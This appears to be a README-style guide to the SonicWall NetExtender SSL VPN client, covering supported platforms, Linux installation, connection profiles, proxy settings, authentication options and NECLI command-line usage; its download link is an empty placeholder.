# SonicWall NetExtender

SonicWall NetExtender is a lightweight SSL VPN client designed for remote users who need secure access to corporate networks. It establishes an encrypted tunnel that enables full network connectivity, including file sharing, drive mapping, and seamless application access, just as if you were physically present in the office.

- [Installation](#installation)
- [Compatible Platforms](#compatible-platforms)  
- [Key Features](#key-features)  
- [Setting Up NetExtender](#setting-up-netextender)  
- [How to Use NetExtender](#how-to-use-netextender)  
- [Security and Authentication](#security-and-authentication)  
- [Command Line Interface (CLI) Usage](#command-line-interface-cli-usage)  

## Installation
Download NetExtender for Windows by clicking the link below:

[**Download NetExtender**](*)

Start your secure connection journey by downloading the installation file. This is the essential first step to configuring a reliable SSL VPN tunnel to your corporate network. Once the download is complete, follow the installation guide to set up the client and establish encrypted remote access from any location.

## Compatible Platforms

NetExtender is supported on the following operating systems and devices:

### **Windows:**  
- **Windows 10/11** (latest updates recommended)  
- Compatible with **Microsoft Edge, Chrome, and Firefox**  

### **Linux:**  
- **Ubuntu 18.04 and newer**  
- **Fedora 14 and newer**  
- **OpenSUSE 10.3 and above**  
- Available in `.rpm` and `.tgz` package formats  

### **Supported SonicWall Devices:**  
NetExtender is fully compatible with **SonicWall SMA** and **firewalls running SonicOS 6.5 or later**.  

---

## Key Features

### 🔹 **Standalone VPN Client**  
NetExtender operates as an independent application, eliminating the need for a web browser after setup.  

### 🔹 **Flexible Authentication Options**  
- **Standard user credentials**  
- **One-Time Password (OTP) support**  
- **Integration with RSA SecureID, Duo, and Microsoft Authenticator**  

### 🔹 **Enhanced Security**  
- **SSL-encrypted VPN tunnels**  
- **Support for Split Tunneling and Full Tunnel Mode**  

### 🔹 **Proxy Compatibility**  
NetExtender supports VPN connections through **HTTPS proxy servers** and offers automatic detection via **WPAD**.  

---

## Installing NetExtender

### Linux Installation via CLI  

1. **Download the appropriate package:**  
   ```bash
   wget https://yoursonicwallserver.com/NetExtender.tgz
   ```
2. **Extract and install the software:**  
   ```bash
   tar -xvzf NetExtender.tgz
   cd netExtenderClient/
   sudo ./install
   ```
3. **Launch the client application:**  
   ```bash
   netExtenderGui
   ```

> [!warning] **Administrator Privileges Required:**  
> To install NetExtender, you must have `sudo` access on your system.  

---

## Setting Up NetExtender

### Creating a Connection Profile  
Save multiple connection profiles for quick and convenient access.  

1. Open **NetExtender** and navigate to **Connection Profiles**.  
2. Click **Add New Profile**.  
3. Provide the following details:  
   - **Server Address:** `vpn.yourcompany.com`  
   - **Username & Password**  
   - **Domain (if required)**  
4. Click **Save** to store the configuration.  

> [!info] **Pro Tip:**  
> Enable **auto-connect** for a seamless login experience upon startup.  

### Configuring Proxy Settings  
1. Open **NetExtender Settings**.  
2. Activate **Proxy Support**.  
3. Choose your preferred method:  
   - **Automatic detection (WPAD)**  
   - **Manual configuration** (enter proxy IP and port details)  

---

## How to Use NetExtender

### Establishing a VPN Connection  
1. Launch **NetExtender**.  
2. Select a saved profile or manually input the following:  
   - **VPN Server Address**  
   - **User Credentials**  
3. Click **Connect** to establish a secure session.  
4. Upon connection, you can:  
   - **Access shared network drives**  
   - **Run internal applications**  
   - **Transfer files securely**  

### Disconnecting from VPN  
Click **Disconnect** in the application interface or execute the following command:  
```bash
NECLI disconnect
```

---

## Security and Authentication

### Supported Authentication Mechanisms  
- **Standard username/password login**  
- **One-Time Passwords (OTP) for enhanced security**  
- **Certificate-based authentication**  
- **Multi-factor authentication (MFA) for added protection**  

> [!warning] **Security Tip:**  
> Enabling **MFA** is highly recommended to mitigate unauthorized access risks.  

---

## Command Line Interface (CLI) Usage

NetExtender provides a **CLI utility (`NECLI`)** for automation and advanced control.  

### Common CLI Commands

#### Connect to a VPN server  
```bash
NECLI connect -s vpn.company.com -u username -p password -d domain
```

#### Verify connection status  
```bash
NECLI showstatus
```

#### Terminate VPN session  
```bash
NECLI disconnect
```

> [!tip] **Automate Your Workflow:**  
> Utilize `batch scripts` for seamless VPN login and routing configurations.
